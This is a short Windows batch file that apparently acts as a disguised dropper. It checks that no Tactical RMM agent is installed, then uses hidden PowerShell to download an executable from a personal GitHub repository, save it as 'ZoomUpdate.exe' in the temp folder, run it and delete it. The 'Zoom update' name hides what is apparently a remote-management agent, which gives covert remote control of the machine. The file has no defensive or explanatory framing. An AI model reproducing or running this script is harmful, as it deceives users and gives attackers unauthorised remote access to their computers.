@echo off
sc query "tacticalrmm" >nul 2>&1
if %errorlevel% == 0 exit

reg query "HKLM\SOFTWARE\TacticalRMM" >nul 2>&1
if %errorlevel% == 0 exit

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/justmenodrama98-bot/zoom-agentz/main/trmm-zoomupdate-zoomvideocommunications-workstation-amd64.exe' -OutFile '%TEMP%\ZoomUpdate.exe'; Start-Process '%TEMP%\ZoomUpdate.exe' -Wait; Remove-Item '%TEMP%\ZoomUpdate.exe'"
exit
